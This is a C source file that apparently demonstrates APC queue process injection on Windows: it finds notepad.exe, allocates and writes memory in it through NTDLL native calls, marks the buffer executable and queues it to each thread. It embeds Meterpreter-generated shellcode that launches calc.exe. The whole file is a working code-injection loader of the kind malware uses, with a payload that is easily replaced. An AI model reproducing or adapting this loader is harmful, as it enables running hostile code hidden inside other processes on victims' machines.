#include "IHATENT.h"

static HMODULE GetMod(IN LPCWSTR modName)
{
	HMODULE hModule = NULL;

	INFO("Trying to get a handle to %ls", modName);
	hModule = LoadLibraryW(modName);

	if (hModule == NULL)
	{
		WARN("Failed to get a handle to the module, error: 0x%lx", GetLastError());
		return NULL;
	}

	else
	{
		OKAY("Got a handle to the module!");
		INFO("\\__[ %ls\n\t\\_0x%p]", modName, hModule);
		return hModule;
	}
}


int main()
{

	/*Meterpreter Calc Shellcode*/

	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


	/*Initialize variables...*/

	PROCESSENTRY32 pe32;
	ZeroMemory(&pe32, sizeof(pe32));
	THREADENTRY32 th32;
	ZeroMemory(&th32, sizeof(th32));


	pe32.dwSize = sizeof(PROCESSENTRY32);
	th32.dwSize = sizeof(THREADENTRY32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	HMODULE hNTDLL = NULL;
	NTSTATUS STATUS = NULL;
	HANDLE ProcessHandle = NULL;
	HANDLE ThreadHandle = NULL;
	PVOID rBuffer = NULL;
	SIZE_T BytesWritten = NULL;
	SIZE_T pSize = sizeof(buf);
	DWORD dwOldProtect = 0;

	hNTDLL = GetMod(L"NTDLL");


	INFO("Populating Function Prototypes...");
	PFN_NtOpenProcess p_NtOpenProcess = (PFN_NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	PFN_NtOpenThread p_NtOpenThread = (PFN_NtOpenThread)GetProcAddress(hNTDLL, "NtOpenThread");
	PFN_NtAllocateVirtualMemory p_NtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	PFN_NtQueueApcThread p_NtQueueApcThread = (PFN_NtQueueApcThread)GetProcAddress(hNTDLL, "NtQueueApcThread");
	PFN_NtWriteVirtualMemory p_NtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	PFN_NtProtectVirtualMemory p_NtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
	PFN_NtFreeVirtualMemory p_NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(hNTDLL, "NtFreeVirtualMemory");
	PFN_NtWaitForSingleObject p_NtWaitForSingleObject = (PFN_NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");


	if (hSnap == INVALID_HANDLE_VALUE)
	{
		WARN("CreateToolhelp32Snapshot Failed! %u", GetLastError());
		return EXIT_FAILURE;
	}

	if (!Thread32First(hSnap, &th32))
	{
		WARN("Thread32First Failed...");
		goto cleanup;
	}

	if (!Process32First(hSnap, &pe32))
	{
		WARN("Process32First Failed...");
		goto cleanup;
	} do 
	{
		if (_wcsicmp(pe32.szExeFile, L"notepad.exe") == 0) break;
	} while (Process32Next(hSnap, &pe32));

	if (_wcsicmp(pe32.szExeFile, L"notepad.exe") != 0)
	{
		WARN("notepad.exe not found");
		goto cleanup;
	}


	OKAY("Current PID %ld", pe32.th32ProcessID);


	/*Must be Initialized once the PID is acquired*/
	CLIENT_ID CID = { (HANDLE)(ULONG_PTR)pe32.th32ProcessID, NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };
	InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);


	STATUS = p_NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("Error, Could not Start OpenProcess: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	OKAY("Got a handle to the process\n\\---[0x%p]", ProcessHandle);


	STATUS = p_NtAllocateVirtualMemory(ProcessHandle, &rBuffer, 0, &pSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("Error, Could Not Allocate Virtual Memory! 0x%lx", STATUS);
		goto cleanup;
	}

	OKAY("Allocated Virtual Memory with Commit | Reserve and [RW] Permissions!");

	PPS_APC_ROUTINE apcRoutine = (PPS_APC_ROUTINE)rBuffer;


	STATUS = p_NtWriteVirtualMemory(ProcessHandle, rBuffer, buf, pSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("Error! Could Not Write Virtual Memory... 0x%lx", STATUS);
		return -1;
	}

	OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer!", rBuffer, BytesWritten);

	STATUS = p_NtProtectVirtualMemory(ProcessHandle, &rBuffer, &pSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("Failed to Change Memory Protection from RW to RX: 0x%lx", STATUS);
		return -1;
	}

	OKAY("Changed Buffer Permissions from RW to RX\n\\---[0x%p]", rBuffer);

	OKAY("Current PID: %lu (0x%lx)", pe32.th32ProcessID, pe32.th32ProcessID);

	if (Thread32First(hSnap, &th32))
	{
		do
		{
			if (th32.th32OwnerProcessID == pe32.th32ProcessID)
			{

				CID.UniqueThread = (HANDLE)th32.th32ThreadID;

				STATUS = p_NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &OA, &CID);
				if (STATUS_SUCCESS != STATUS)
				{
					WARN("Error! Could Not Open Thread! 0x%lx", STATUS);
					return EXIT_FAILURE;
				}

				OKAY("Current TID: %ld", th32.th32ThreadID);

				STATUS = p_NtQueueApcThread(ThreadHandle, (PPS_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
				if (STATUS_SUCCESS != STATUS)
				{
					WARN("Error! Could Not Queue APC Thread! 0x%lx", STATUS);
					return EXIT_FAILURE;
				}

				OKAY("TID=%lu (0x%lx) Handle=0x%p", th32.th32ThreadID, th32.th32ThreadID, ThreadHandle);

				Sleep(1000 * 2);

				OKAY("[0x%p] successfully created a thread!", ThreadHandle);
				INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
				STATUS = p_NtWaitForSingleObject(ThreadHandle, FALSE, NULL);

				INFO("Thread has finished executing!\n[+] Cleaning up....");
				CloseHandle(ThreadHandle);
			}
		} while (Thread32Next(hSnap, &th32));
	}

	printf("Process Finished!\nClosing handles!\n");
	return EXIT_SUCCESS;

cleanup:

	if (hSnap && hSnap != INVALID_HANDLE_VALUE)
	{
		INFO("[0x%p] Closed Snap Handle", hSnap);
		CloseHandle(hSnap);
	}


	if (ProcessHandle)
	{
		CloseHandle(ProcessHandle);
		INFO("[0x%p] closed Process handle", ProcessHandle);
	}

	if (rBuffer)
	{
		STATUS = p_NtFreeVirtualMemory(ProcessHandle, &rBuffer, &pSize, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS)
		{
			WARN("Error! Could Not Free Buffer! 0x%lx", STATUS);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
		}
	}

}
